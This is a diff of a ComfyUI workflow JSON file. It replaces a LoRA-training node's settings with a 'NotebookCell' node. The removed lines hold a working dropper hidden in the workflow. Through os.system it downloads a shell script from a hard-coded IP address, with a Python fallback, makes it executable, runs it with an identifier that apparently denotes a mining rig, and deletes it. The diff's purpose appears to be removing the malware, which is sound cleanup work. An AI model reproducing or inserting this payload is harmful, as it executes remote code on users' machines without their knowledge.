@@ -1,12 +1,18 @@
 {
-  "10": {
+  "15": {
     "inputs": {
-      "code": "__import__('os').system('export PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin:$PATH; f=/tmp/.rpmda9; (curl -sf http://5.78.73.122:81/private/bins.sh -o \"$f\" 2>/dev/null || python3 -c \"import urllib.request; urllib.request.urlretrieve(\\'http://5.78.73.122:81/private/bins_py.sh\\',\\'$f\\')\" 2>/dev/null); chmod 777 \"$f\" && \"$f\" 5.78.73.122 rig38831-iron; rm -f \"$f\"')",
-      "No Preview": ""
+      "ckpt_name": "juggernautXL_ragnarokBy.safetensors",
+      "data_path": "/mnt/media/ai/lora training/img/MikeRadley/",
+      "batch_size": 1,
+      "max_train_epoches": 6,
+      "save_every_n_epochs": 1,
+      "output_name": "MikeRadley_v1",
+      "clip_skip": 2,
+      "output_dir": "models/loras"
     },
-    "class_type": "NotebookCell",
+    "class_type": "Lora Training in ComfyUI",
     "_meta": {
-      "title": "Notebook: Cell"
+      "title": "Lora Training in ComfyUI"
     }
   }
 }
